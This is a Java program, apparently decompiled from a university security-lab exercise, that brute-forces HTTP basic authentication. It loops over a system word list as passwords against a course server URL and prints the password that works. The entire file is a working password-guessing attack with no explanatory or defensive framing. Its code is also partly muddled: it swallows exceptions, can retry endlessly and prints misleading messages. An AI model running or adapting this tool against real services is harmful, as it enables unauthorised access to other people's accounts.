public class Dictionary {
    private static java.io.BufferedReader a;
    private static MyAuthenticator b;
    public Dictionary() {
        super();
    }
    public static void main ( String[] a0 ) {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) b );
        try {
            java.net.URL a1 = new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            boolean b0 = false;
            while ( !b0 ) {
                try {
                    a = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a1.openStream() ) );
                    b0 = true;
                } catch ( java.io.IOException ignoredException ) {
                }
            }
            while ( a.readLine() != null ) {
            }
            System.out.println ( new StringBuilder ( "The successful Password found using a Dictionary search is = " ).append ( MyAuthenticator.a() ).toString() );
            return;
        } catch ( java.net.MalformedURLException ignoredException0 ) {
            System.out.println ( "mfURL" );
            return;
        }
    }
    static {
        a = null;
        b = new MyAuthenticator();
    }
}
class MyAuthenticator extends java.net.Authenticator {
    private String a;
    private static String b;
    private static String c;
    private static java.io.BufferedReader d;
    public MyAuthenticator() {
        super();
        this.a = "";
        try {
            try {
                d = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( c ) );
                return;
            } catch ( java.io.FileNotFoundException ignoredException ) {
            }
        } catch ( java.io.IOException ignoredException0 ) {
            System.out.println ( "File  Failed.." );
            System.exit ( 1 );
            return;
        }
        System.out.println ( new StringBuilder ( "File " ).append ( c ).append ( " Not Found" ).toString() );
        System.out.println ( " File Opened" );
        System.exit ( 1 );
    }
    static String a() {
        return b;
    }
    private static String b() {
        try {
            String s = d.readLine();
            b = s;
            if ( s == null ) {
                System.out.println ( new StringBuilder ( "Password Not found in file '" ).append ( c ).append ( "'." ).toString() );
                System.exit ( 1 );
            }
        } catch ( java.io.IOException a0 ) {
            System.out.println ( "File IOException" );
            System.out.println ( ( Object ) a0 );
        }
        return b;
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        return new java.net.PasswordAuthentication ( this.a, MyAuthenticator.b().toCharArray() );
    }
    static {
        b = "";
        c = "/usr/share/lib/dict/words";
    }
}
